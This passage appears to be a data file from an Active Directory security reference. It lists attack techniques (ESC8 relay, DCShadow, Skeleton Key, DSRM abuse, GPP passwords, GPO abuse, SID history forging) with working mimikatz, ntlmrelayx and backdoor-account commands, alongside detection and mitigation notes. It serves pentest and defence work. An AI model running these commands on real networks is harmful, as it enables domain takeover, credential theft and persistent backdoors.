    mitigations: ["Restrict ManageCA and ManageCertificates permissions", "Require multi-person approval for CA changes", "Audit CA ACLs regularly"]
  },
  {
    id: "adcs-007",
    name: "ESC8 — NTLM Relay to AD CS HTTP Enrollment",
    category: "ADCS Attacks",
    description: "The AD CS web enrollment endpoint (/certsrv/) accepts NTLM authentication without EPA (Extended Protection for Authentication). An attacker relays coerced NTLM authentication (e.g., from a DC via PetitPotam) to the ADCS web enrollment to request a certificate as the victim.",
    prerequisites: ["ADCS web enrollment enabled without EPA", "Ability to coerce NTLM authentication from target"],
    tools: ["Impacket (ntlmrelayx.py)", "PetitPotam", "Certipy"],
    steps: [
      { step: 1, command: "impacket-ntlmrelayx -t http://adcs01/certsrv/certfnsh.asp -smb2support --adcs --template DomainController", description: "Set up relay to ADCS web enrollment" },
      { step: 2, command: "python3 PetitPotam.py attacker_ip dc01.domain.local", description: "Coerce DC to authenticate" },
      { step: 3, command: "certipy auth -pfx dc01.pfx -dc-ip 10.10.10.1", description: "Authenticate with the obtained certificate" }
    ],
    detection: ["Monitor for NTLM authentication to ADCS web endpoints", "Certificate requests via web enrollment from machine accounts"],
    mitigations: ["Enable EPA on ADCS web enrollment", "Disable HTTP enrollment (use DCOM/RPC instead)", "Enforce HTTPS with channel binding", "Apply KB5005413"]
  }
];

export const AD_PERSISTENCE = [
  {
    id: "persist-001",
    name: "AdminSDHolder Abuse",
    category: "Persistence",
    description: "The AdminSDHolder object's ACL is propagated to all protected groups (Domain Admins, Enterprise Admins, etc.) every 60 minutes by the SDProp process. Adding a backdoor ACE to AdminSDHolder grants persistent control over all protected groups.",
    tools: ["PowerView", "AD Module"],
    steps: [
      { step: 1, command: "Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' -PrincipalIdentity backdooruser -Rights All", description: "Add GenericAll rights for backdoor user on AdminSDHolder" }
    ],
    detection: ["Monitor ACL changes on the AdminSDHolder object", "Event ID 5136 on CN=AdminSDHolder"],
    mitigations: ["Regularly audit AdminSDHolder ACLs", "Alert on any AdminSDHolder modifications"]
  },
  {
    id: "persist-002",
    name: "DCShadow",
    category: "Persistence",
    description: "Registers a rogue Domain Controller in the domain and uses AD replication to inject arbitrary changes (add users to groups, modify ACLs, create objects) that appear as legitimate replication. Very difficult to detect.",
    tools: ["Mimikatz"],
    steps: [
      { step: 1, command: "mimikatz # lsadump::dcshadow /object:targetuser /attribute:primaryGroupID /value:512", description: "Add user to Domain Admins via DCShadow replication" },
      { step: 2, command: "mimikatz # lsadump::dcshadow /push", description: "Push the changes (run from another mimikatz instance with DA rights)" }
    ],
    detection: ["Monitor for new domain controller registrations in the domain", "Unusual replication traffic from non-DC machines", "New nTDSDSA objects in the Configuration partition"],
    mitigations: ["Monitor for rogue DC registration", "Restrict who can create computer objects with specific attributes", "Use Microsoft Defender for Identity"]
  },
  {
    id: "persist-003",
    name: "Skeleton Key",
    category: "Persistence",
    description: "Patches the LSASS process on a Domain Controller to accept a master password alongside every user's real password. Any account can authenticate with either their real password or the skeleton key password.",
    tools: ["Mimikatz"],
    steps: [
      { step: 1, command: "mimikatz # privilege::debug", description: "Get debug privileges" },
      { step: 2, command: "mimikatz # misc::skeleton", description: "Inject skeleton key (default password: mimikatz)" },
      { step: 3, command: "net use \\\\dc01\\c$ /user:domain\\anyuser mimikatz", description: "Authenticate as any user with the skeleton key password" }
    ],
    detection: ["Monitor for LSASS memory modifications", "Credential Guard prevents this attack", "Unusual authentication success patterns"],
    mitigations: ["Enable Credential Guard on DCs (prevents LSASS patching)", "Run LSASS as Protected Process Light (PPL)", "Monitor LSASS integrity"]
  },
  {
    id: "persist-004",
    name: "DSRM (Directory Services Restore Mode) Abuse",
    category: "Persistence",
    description: "The DSRM password (set during DC promotion) can be used to log into the DC locally. By changing the DsrmAdminLogonBehavior registry key to 2, the DSRM password can be used for network logon, providing a persistent backdoor.",
    tools: ["Mimikatz", "reg.exe"],
    steps: [
      { step: 1, command: "mimikatz # lsadump::lsa /patch", description: "Dump the DSRM password hash from the DC" },
      { step: 2, command: "reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /v DsrmAdminLogonBehavior /t REG_DWORD /d 2", description: "Enable network logon with DSRM account" },
      { step: 3, command: "mimikatz # sekurlsa::pth /user:Administrator /domain:dc01 /ntlm:<DSRM_HASH> /run:cmd", description: "PtH with the DSRM hash to access the DC" }
    ],
    detection: ["Monitor DsrmAdminLogonBehavior registry key changes", "Event ID 4657 on the registry key", "Logon events using the local Administrator account on DCs"],
    mitigations: ["Monitor DsrmAdminLogonBehavior registry value", "Regularly change the DSRM password", "Alert on any modification of this registry key"]
  }
];

export const BLOODHOUND_QUERIES = [
  { id: "bh-001", name: "Find all Domain Admins", query: "MATCH (n:User)-[:MemberOf*1..]->(g:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'}) RETURN n.name" },
  { id: "bh-002", name: "Shortest path to Domain Admin", query: "MATCH p=shortestPath((n:User {name:'LOWPRIV@DOMAIN.LOCAL'})-[*1..]->(m:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'})) RETURN p" },
  { id: "bh-003", name: "Find Kerberoastable users", query: "MATCH (n:User) WHERE n.hasspn=true RETURN n.name, n.serviceprincipalnames" },
  { id: "bh-004", name: "Find AS-REP Roastable users", query: "MATCH (n:User) WHERE n.dontreqpreauth=true RETURN n.name" },
  { id: "bh-005", name: "Find computers with unconstrained delegation", query: "MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name" },
  { id: "bh-006", name: "Find users with constrained delegation", query: "MATCH (u:User) WHERE u.allowedtodelegate IS NOT NULL RETURN u.name, u.allowedtodelegate" },
  { id: "bh-007", name: "Find all GPOs", query: "MATCH (g:GPO) RETURN g.name, g.gpcpath" },
  { id: "bh-008", name: "Users with DCSync rights", query: "MATCH (n)-[:GetChanges|GetChangesAll*1..]->(d:Domain) RETURN n.name, labels(n)" },
  { id: "bh-009", name: "Find computers where Domain Users are local admin", query: "MATCH (g:Group {name:'DOMAIN USERS@DOMAIN.LOCAL'})-[:AdminTo]->(c:Computer) RETURN c.name" },
  { id: "bh-010", name: "Computers with LAPS disabled", query: "MATCH (c:Computer) WHERE c.haslaps=false RETURN c.name" },
  { id: "bh-011", name: "Find all sessions for a user", query: "MATCH (u:User {name:'TARGET@DOMAIN.LOCAL'})-[:HasSession]->(c:Computer) RETURN c.name" },
  { id: "bh-012", name: "Users who can RDP to computers", query: "MATCH (u:User)-[:CanRDP]->(c:Computer) RETURN u.name, c.name" },
  { id: "bh-013", name: "Users with GenericAll on other users", query: "MATCH (u1:User)-[:GenericAll]->(u2:User) RETURN u1.name, u2.name" },
  { id: "bh-014", name: "Find ADCS enrollment rights", query: "MATCH (n)-[:Enroll|AutoEnroll]->(ct:CertTemplate) RETURN n.name, ct.name" },
  { id: "bh-015", name: "Shortest paths from owned principals", query: "MATCH p=shortestPath((n {owned:true})-[*1..]->(m:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'})) RETURN p" },
  { id: "bh-016", name: "Users with WriteOwner on groups", query: "MATCH (u:User)-[:WriteOwner]->(g:Group) RETURN u.name, g.name" },
  { id: "bh-017", name: "Users with WriteDacl on computers", query: "MATCH (u:User)-[:WriteDacl]->(c:Computer) RETURN u.name, c.name" },
  { id: "bh-018", name: "All paths from Kerberoastable users to DA", query: "MATCH (u:User {hasspn:true}), (g:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'}), p=shortestPath((u)-[*1..]->(g)) RETURN p" },
  { id: "bh-019", name: "Computers where specific user has admin", query: "MATCH (u:User {name:'TARGET@DOMAIN.LOCAL'})-[:AdminTo]->(c:Computer) RETURN c.name" },
  { id: "bh-020", name: "Find nested group memberships", query: "MATCH (u:User)-[:MemberOf*1..5]->(g:Group) RETURN u.name, collect(g.name)" },
  { id: "bh-021", name: "Users with ForceChangePassword rights", query: "MATCH (u1:User)-[:ForceChangePassword]->(u2:User) RETURN u1.name, u2.name" },
  { id: "bh-022", name: "Computers with SMB signing disabled", query: "MATCH (c:Computer) WHERE c.signing=false RETURN c.name" },
  { id: "bh-023", name: "High-value targets not in Protected Users", query: "MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'}) WHERE NOT (u)-[:MemberOf*1..]->(:Group {name:'PROTECTED USERS@DOMAIN.LOCAL'}) RETURN u.name" },
  { id: "bh-024", name: "All Trust relationships", query: "MATCH (d1:Domain)-[r:TrustedBy]->(d2:Domain) RETURN d1.name, r.trusttype, d2.name" },
  { id: "bh-025", name: "Users with AddMember rights on groups", query: "MATCH (u:User)-[:AddMember]->(g:Group) RETURN u.name, g.name" },
  { id: "bh-026", name: "Find SQL Server instances", query: "MATCH (c:Computer) WHERE any(spn IN c.serviceprincipalnames WHERE spn CONTAINS 'MSSQLSvc') RETURN c.name" },
  { id: "bh-027", name: "Users who never logged in", query: "MATCH (u:User) WHERE u.lastlogon=-1.0 AND u.enabled=true RETURN u.name" },
  { id: "bh-028", name: "Users with password not required", query: "MATCH (u:User {passwordnotreqd:true}) RETURN u.name" },
  { id: "bh-029", name: "Users with password never expires", query: "MATCH (u:User {pwdneverexpires:true}) RETURN u.name" },
  { id: "bh-030", name: "Computers running outdated OS", query: "MATCH (c:Computer) WHERE c.operatingsystem CONTAINS 'Server 2008' OR c.operatingsystem CONTAINS 'Windows 7' RETURN c.name, c.operatingsystem" }
];

export const LDAP_ATTACKS = [
  {
    id: "ldap-001",
    name: "LDAP Anonymous Bind Enumeration",
    category: "LDAP Attacks",
    description: "When LDAP anonymous binds are enabled (common in older AD environments), an attacker can enumerate the entire directory without any credentials — users, groups, computers, OUs, GPOs, trusts, SPNs.",
    tools: ["ldapsearch", "windapsearch", "ldapdomaindump"],
    steps: [
      { step: 1, command: "ldapsearch -x -H ldap://dc01.domain.local -b 'DC=domain,DC=local' '(objectClass=user)' sAMAccountName", description: "Enumerate all users anonymously" },
      { step: 2, command: "ldapsearch -x -H ldap://dc01.domain.local -b 'DC=domain,DC=local' '(objectClass=group)' cn member", description: "Enumerate all groups and their members" },
      { step: 3, command: "python3 windapsearch.py -d domain.local --dc-ip 10.10.10.1 -U", description: "Enumerate users with windapsearch" },
      { step: 4, command: "ldapdomaindump -u '' -p '' ldap://dc01.domain.local", description: "Full domain dump with ldapdomaindump" }
    ],
    detection: ["Monitor for anonymous LDAP binds", "Alert on large LDAP queries from non-domain machines"],
    mitigations: ["Disable anonymous LDAP binds (default in modern AD)", "Enforce LDAP signing", "Restrict LDAP access via firewall"]
  },
  {
    id: "ldap-002",
    name: "LDAP Signing Not Required",
    category: "LDAP Attacks",
    description: "When LDAP signing is not required, NTLM relay attacks can target the LDAP service. An attacker relays NTLM authentication to LDAP/LDAPS to modify AD objects, add users to groups, or configure delegation.",
    tools: ["Impacket (ntlmrelayx.py)"],
    steps: [
      { step: 1, command: "nxc ldap dc01.domain.local -u '' -p '' -M ldap-checker", description: "Check if LDAP signing is required" },
      { step: 2, command: "impacket-ntlmrelayx -t ldap://dc01.domain.local --delegate-access", description: "Relay to LDAP to configure RBCD" }
    ],
    detection: ["Audit LDAP signing configuration", "Monitor for NTLM authentication to LDAP"],
    mitigations: ["Enforce LDAP signing via GPO: Domain controller: LDAP server signing requirements = Require signing", "Enforce LDAP channel binding"]
  }
];

export const GROUP_POLICY_ATTACKS = [
  {
    id: "gpo-001",
    name: "GPP Passwords (Group Policy Preferences)",
    category: "Group Policy Attacks",
    description: "Group Policy Preferences (GPP) allowed administrators to set local passwords, drive mappings, and scheduled tasks with embedded credentials. The password is AES-256 encrypted but Microsoft published the key, making decryption trivial. Patched by MS14-025 but old GPP XML files may still exist in SYSVOL.",
    tools: ["gpp-decrypt", "CrackMapExec", "Get-GPPPassword (PowerView)"],
    steps: [
      { step: 1, command: "findstr /S /I cpassword \\\\domain.local\\sysvol\\domain.local\\policies\\*.xml", description: "Search SYSVOL for cpassword fields" },
      { step: 2, command: "gpp-decrypt <ENCRYPTED_CPASSWORD>", description: "Decrypt the GPP password" },
      { step: 3, command: "nxc smb dc01.domain.local -u user -p pass -M gpp_password", description: "Auto-find GPP passwords with CrackMapExec" },
      { step: 4, command: "Get-GPPPassword -Server dc01.domain.local", description: "Find GPP passwords with PowerView" }
    ],
    detection: ["Scan SYSVOL for residual GPP XML files with cpassword attributes"],
    mitigations: ["Delete all GPP XML files containing cpassword from SYSVOL", "Apply MS14-025 patch", "Use LAPS for local admin passwords instead"]
  },
  {
    id: "gpo-002",
    name: "GPO Abuse — Modifiable GPOs",
    category: "Group Policy Attacks",
    description: "If a user has write permissions on a GPO linked to a target OU, they can modify the GPO to deploy malicious scripts, scheduled tasks, or software that execute on all machines in that OU.",
    tools: ["SharpGPOAbuse", "PowerView", "pyGPOAbuse"],
    steps: [
      { step: 1, command: "Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match 'WriteProperty|WriteDacl|WriteOwner|GenericAll|GenericWrite') -and ($_.SecurityIdentifier -match 'S-1-5-21-.*-\\d{4,}$') }", description: "Find GPOs writable by non-admin users" },
      { step: 2, command: "SharpGPOAbuse.exe --AddComputerTask --TaskName 'Backdoor' --Author 'NT AUTHORITY\\SYSTEM' --Command 'cmd.exe' --Arguments '/c net localgroup Administrators backdoor /add' --GPOName 'Vulnerable GPO'", description: "Add a scheduled task via GPO abuse" },
      { step: 3, command: "python3 pyGPOAbuse.py domain.local/user:pass -gpo-id '{GPO-GUID}' -command 'net user backdoor P@ss123 /add && net localgroup Administrators backdoor /add'", description: "Abuse GPO with pyGPOAbuse" }
    ],
    detection: ["Monitor GPO modifications (Event ID 5136 on GPO objects)", "Alert on new scheduled tasks or scripts deployed via GPO"],
    mitigations: ["Restrict GPO write permissions to domain admins only", "Audit GPO ACLs regularly", "Implement change control for GPO modifications"]
  }
];

export const TRUST_ATTACKS = [
  {
    id: "trust-001",
    name: "Inter-Forest Trust Abuse — SID History Injection",
    category: "Trust Attacks",
    description: "In a two-way forest trust without SID filtering, an attacker with Domain Admin in one forest can forge a Golden Ticket with the Enterprise Admin SID of the other forest injected into the SID history, gaining full access to the trusted forest.",
    prerequisites: ["Domain Admin in one forest", "Two-way trust without SID filtering", "KRBTGT hash of the compromised domain"],
    tools: ["Mimikatz"],
    steps: [
      { step: 1, command: "mimikatz # lsadump::dcsync /user:krbtgt /domain:child.domain.local", description: "Get KRBTGT hash from child domain" },
      { step: 2, command: "mimikatz # kerberos::golden /user:Administrator /domain:child.domain.local /sid:S-1-5-21-CHILD-SID /krbtgt:<HASH> /sids:S-1-5-21-PARENT-SID-519 /ptt", description: "Forge ticket with Enterprise Admin SID from parent domain" }
    ],
    detection: ["Monitor for tickets with SID history containing privileged SIDs from other domains", "Enable SID filtering on forest trusts"],
    mitigations: ["Enable SID filtering on inter-forest trusts", "Use selective authentication on trusts", "Monitor for cross-domain privilege escalation"]
  }
];

export const ENUMERATION_TOOLS = {
  bloodhound: { name: "BloodHound", description: "Graph-based AD attack path visualization", collectors: ["SharpHound.exe", "BloodHound.py (remote)", "AzureHound (Azure AD)"], commands: ["SharpHound.exe -c All -d domain.local", "bloodhound-python -c All -d domain.local -u user -p pass -ns dc_ip"] },
  powerview: { name: "PowerView", description: "PowerShell AD enumeration framework", commands: ["Get-DomainUser", "Get-DomainGroup", "Get-DomainComputer", "Get-DomainGPO", "Get-DomainTrust", "Find-DomainShare", "Find-LocalAdminAccess", "Get-DomainObjectAcl"] },
  crackmapexec: { name: "CrackMapExec / NetExec", description: "Network protocol execution and enumeration", commands: ["nxc smb target -u user -p pass --shares", "nxc smb target -u user -p pass --users", "nxc smb target -u user -p pass --groups", "nxc smb target -u user -p pass -M spider_plus", "nxc ldap target -u user -p pass --kerberoast", "nxc ldap target -u user -p pass --asreproast"] },
  impacket: { name: "Impacket Suite", description: "Python network protocol tools", key_tools: ["GetUserSPNs.py", "GetNPUsers.py", "secretsdump.py", "ntlmrelayx.py", "psexec.py", "wmiexec.py", "smbexec.py", "getTGT.py", "getST.py", "ticketer.py", "addcomputer.py", "rbcd.py"] }
};
